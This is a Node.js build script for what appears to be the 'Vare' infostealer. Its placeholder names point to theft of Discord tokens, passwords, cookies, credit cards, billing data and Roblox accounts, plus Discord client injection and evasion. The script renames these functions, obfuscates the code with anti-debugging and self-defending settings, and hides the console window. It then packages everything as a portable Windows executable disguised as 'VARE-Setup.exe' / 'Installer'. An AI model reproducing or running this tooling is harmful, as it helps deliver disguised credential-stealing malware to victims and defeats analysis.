var JavaScriptObfuscator = require('javascript-obfuscator');
var fs = require('fs');
const { execSync, ChildProcess } = require('child_process');
const vare = require("electron-builder");



function gen(length) {
  let result = '';
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
  const charactersLength = characters.length;
  
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  
  return result;
}


async function newbuild() {
    const aa = gen(10)
    const d = await vare.build({
    targets: vare.Platform.WINDOWS.createTarget(),
    config: {
      npmRebuild: true,
      nodeGypRebuild: false,
      buildDependenciesFromSource: true,
      electronVersion: "24.1.1",
      appId: `${aa}`,
      nodeVersion: "18.15.0",
      productName: "Installer",
      compression: 'maximum',
      directories: {
        app: "./varesource",
        output: `./varebuild/`,
      },
      win: {
        artifactName: "VARE-Setup.exe",
        publisherName: "Vare",
        legalTrademarks: "Vare",
        target: [
          {
            target: "portable",
            arch: [
              "ia32",
            ]
          }
        ]
      }
    }
  })
}


async function obfuscate() {
  renamedcode = fs.readFileSync('varerenamed.js','utf8').toString();
  console.log('[+] Obfuscation Started')
    var obfuscationResult = await JavaScriptObfuscator.obfuscate(renamedcode,{
        "compact": false,
        "controlFlowFlattening": true,
        "controlFlowFlatteningThreshold": 1,
        "deadCodeInjection": true,
        "deadCodeInjectionThreshold": 1,
        "debugProtection": true,
        "debugProtectionInterval": 5000,
        "disableConsoleOutput": true,
        "rotateStringArray": true,
        "selfDefending": true,
        target: "node"
      }
    ).getObfuscatedCode()
      var modules = `require("fs");
require("path");
require("crypto");
require('sqlite3');
require("vareapi");
require('axios');
require('os');
require('fs-extra')
require('form-data');
require('jszip');
require('screenshot-desktop');
require('child_process');   
require('node-hide-console-window');
require('buffer-replace');
async function hideMex() {
  require("node-hide-console-window").hideConsole();
}
hideMex();
`
      fs.writeFileSync('./varesource/vareobf.js', modules + obfuscationResult)
      console.log('[+] Obfuscation Completed')
      await fs.unlinkSync('./varerenamed.js');
}



async function renameFuncs() {
  var data = fs.readFileSync('vare.js', 'utf8').toString();
    function generateRandomString(length) {
      let result = '';
      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
      const charactersLength = characters.length;
      
      for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
      }
      
      return result;
    }
    const newData = data.replace(/%webhookstring%/g, generateRandomString(25))
                        .replace(/%keywordstring%/g, generateRandomString(25))
                        .replace(/%GETNETWORK%/g, generateRandomString(25))
                        .replace(/%GETEMBED%/g, generateRandomString(25))
                        .replace(/%GETIP%/g, generateRandomString(25))
                        .replace(/%GETCOUNTRY%/g, generateRandomString(25))
                        .replace(/%INSTADATA%/g, generateRandomString(25))
                        .replace(/%VAREINSTA%/g, generateRandomString(25))
                        .replace(/%SENDLOGS%/g, generateRandomString(25))
                        .replace(/%VARECOOKIES%/g, generateRandomString(25))
                        .replace(/%SENDROBLOX%/g, generateRandomString(25))
                        .replace(/%PCNAME%/g, generateRandomString(25))
                        .replace(/%VAREPASS%/g, generateRandomString(25))
                        .replace(/%VARESTARTUP%/g, generateRandomString(25))
                        .replace(/%VARECARDS%/g, generateRandomString(25))
                        .replace(/%VARESERVERS%/g, generateRandomString(25))
                        .replace(/%VARENITRO%/g, generateRandomString(25))
                        .replace(/%VAREFINDTOKEN%/g, generateRandomString(25))
                        .replace(/%VARESTEALTOKEN%/g, generateRandomString(25))
                        .replace(/%VAREFRIENDS%/g, generateRandomString(25))
                        .replace(/%VAREBILLDATA%/g, generateRandomString(25))
                        .replace(/%VAREBADGES%/g, generateRandomString(25))
                        .replace(/%VARERAREBADGES%/g, generateRandomString(25))
                        .replace(/%VAREAUTOFILL%/g, generateRandomString(25))
                        .replace(/%VARESLEEP%/g, generateRandomString(25))
                        .replace(/%VAREUSERDATA%/g, generateRandomString(25))
                        .replace(/%VARESCREENSHOT%/g, generateRandomString(25))
                        .replace(/%VAREEVASION%/g, generateRandomString(25))
                        .replace(/%STARTVARE%/g, generateRandomString(25))
                        .replace(/%VAREALLCOOKIES%/g, generateRandomString(25))
                        .replace(/%VAREALLPASS%/g, generateRandomString(25))
                        .replace(/%VAREALLAUTOFILL%/g, generateRandomString(25))
                        .replace(/%VAREALLCCS%/g, generateRandomString(25))
                        .replace(/%VARECHECKSTART%/g, generateRandomString(25))
                        .replace(/%FINDINDEX%/g, generateRandomString(25))
                        .replace(/%FINDINJ%/g, generateRandomString(25))
                        .replace(/%INJECTT%/g, generateRandomString(25))
                        .replace(/%KILLDC%/g, generateRandomString(25))
                        .replace(/%BETTERBROKE%/g, generateRandomString(25))
                        .replace(/%DISCORDINJ%/g, generateRandomString(25))
                        .replace(/%INJURLL%/g, generateRandomString(25))
                        .replace(/%GETROBLOX%/g, generateRandomString(25));

    fs.writeFileSync('varerenamed.js', newData, 'utf8', err => {
      if (err) throw err;
    });
}


async function vareBuilder() {
  if (fs.existsSync('./varebuild') && fs.existsSync('./varesource')) {
    await fs.rmSync('./varebuild', { recursive: true, force: true });
    await fs.rmSync('./varesource', { recursive: true, force: true });
  }
  await renameFuncs();
  console.log('[+] Functions Renamed')
  await renamePackage();
  console.log('[+] Package.json Renamed')
  await obfuscate();
  await newbuild();
  await fs.rmSync('./varebuild/win-ia32-unpacked', { recursive: true, force: true });
  await fs.unlinkSync('./varebuild/builder-debug.yml');
  await fs.unlinkSync('./varebuild/builder-effective-config.yaml');
}


async function renamePackage() {
  const packagePath = ('./package.json');
  const packageJson = JSON.parse(fs.readFileSync(packagePath, 'utf8'));
  function generateRandomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    
    for (let i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    
    return result;
  }
  const randomName = `Vare${generateRandomString(10)}`
  packageJson.name = randomName;
  if (!fs.existsSync('./varesource/package.json')) {
    fs.mkdirSync('./varesource', (err) => {
    });
  };
  fs.writeFileSync('./varesource/package.json', JSON.stringify(packageJson, null, 2));
}

async function vareInstaller() {
  await execSync('npm install .');
  await execSync('npm install -g node-gyp');
  await execSync('npm install electron --save-dev');
  await execSync('npm install electron-builder --save-dev');
  await execSync('npm install vareapi');
  await execSync('npm install javascript-obfuscator');
  await execSync('npm rebuild');
}

(async () => {
  if (process.argv[2] == 'varebuilder') {
    await vareBuilder();
  } else if (process.argv[2] == 'vareinstaller') {
    await vareInstaller();
  }
})();